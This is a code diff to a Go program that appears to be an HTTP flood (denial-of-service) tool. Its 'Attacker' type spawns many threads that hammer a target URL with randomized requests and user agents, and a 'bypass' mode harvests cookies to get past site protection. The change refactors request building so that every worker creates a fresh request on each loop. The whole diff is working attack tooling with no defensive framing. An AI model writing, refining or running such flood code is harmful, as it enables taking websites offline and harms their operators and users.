@@ -4,7 +4,6 @@ import (
 	"bytes"
 	crand "crypto/rand"
 	"crypto/tls"
-	"fmt"
 	"golang.org/x/net/html"
 	"math"
 	"math/big"
@@ -20,7 +19,6 @@ type Attacker struct {
 	attack Attack
 
 	data      string
-	request   *http.Request
 	cookies   []Cookie
 	userAgent string
 }
@@ -61,7 +59,6 @@ func (a *Attacker) SolveCookie() error {
 	for i := 0; i < 3; i++ {
 		cookies, err = GetCookies(a.attack.TargetURL, a.attack.CustomHeader, a.userAgent)
 		if err != nil {
-			fmt.Println(err)
 			time.Sleep(time.Second * 3)
 			continue
 		}
@@ -96,24 +93,25 @@ func (a *Attacker) RandomizeData() {
 	a.data = randomizedData
 }
 
-func (a *Attacker) BuildRequest() error {
+func (a *Attacker) BuildRequest() (*http.Request, error) {
 	var request *http.Request
 	var err error
+	data := a.data
 	if a.attack.Method == "POST" {
-		request, err = http.NewRequest(a.attack.Method, a.attack.TargetURL, bytes.NewBuffer([]byte(a.data)))
+		request, err = http.NewRequest(a.attack.Method, a.attack.TargetURL, strings.NewReader(data))
 		if err != nil {
-			return err
+			return nil, err
 		}
 		request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	} else if a.attack.Method == "GET" {
 		request, err = http.NewRequest(a.attack.Method, a.attack.TargetURL+"?"+a.data, nil)
 		if err != nil {
-			return err
+			return nil, err
 		}
 	} else {
 		request, err = http.NewRequest(a.attack.Method, a.attack.TargetURL, nil)
 		if err != nil {
-			return err
+			return nil, err
 		}
 	}
 	request.Header.Add("Connection", "keep-alive")
@@ -166,17 +164,12 @@ func (a *Attacker) BuildRequest() error {
 		request.Header.Add(strings.Split(a.attack.CustomHeader, ": ")[0],
 			strings.Split(a.attack.CustomHeader, ": ")[1])
 	}
-	a.request = request
-	return nil
+	return request, nil
 }
 
 func (a *Attacker) DefaultAttack() {
 	a.SetUserAgent()
 	a.RandomizeData()
-	err := a.BuildRequest()
-	if err != nil {
-		return
-	}
 
 	expired := make(chan bool)
 	for i := 0; i < a.attack.Thread; i++ {
@@ -214,10 +207,6 @@ func (a *Attacker) BypassAttack() {
 		return
 	}
 	a.RandomizeData()
-	err = a.BuildRequest()
-	if err != nil {
-		return
-	}
 
 	expired := make(chan bool)
 	for i := 0; i < a.attack.Thread; i++ {
@@ -231,7 +220,6 @@ func (a *Attacker) BypassAttack() {
 		time.Sleep(time.Second)
 		if !Equal(lastCookie, a.cookies) {
 			a.RandomizeData()
-			a.BuildRequest()
 		}
 	}
 	for i := 0; i < a.attack.Thread+1; i++ {
@@ -254,7 +242,12 @@ func (a *Attacker) CheckResponse(expired chan bool) {
 		if exit {
 			break
 		}
-		r, err := client.Do(a.request)
+		request, err := a.BuildRequest()
+		if err != nil {
+			time.Sleep(time.Second)
+			continue
+		}
+		r, err := client.Do(request)
 		if err != nil {
 			time.Sleep(time.Second)
 			continue
@@ -316,7 +309,12 @@ func (a *Attacker) Worker(expired chan bool) {
 		if exit {
 			break
 		}
-		r, err := client.Do(a.request)
+		request, err := a.BuildRequest()
+		if err != nil {
+			time.Sleep(time.Millisecond * time.Duration(a.attack.Interval))
+			continue
+		}
+		r, err := client.Do(request)
 		if err == nil {
 			r.Body.Close()
 		}
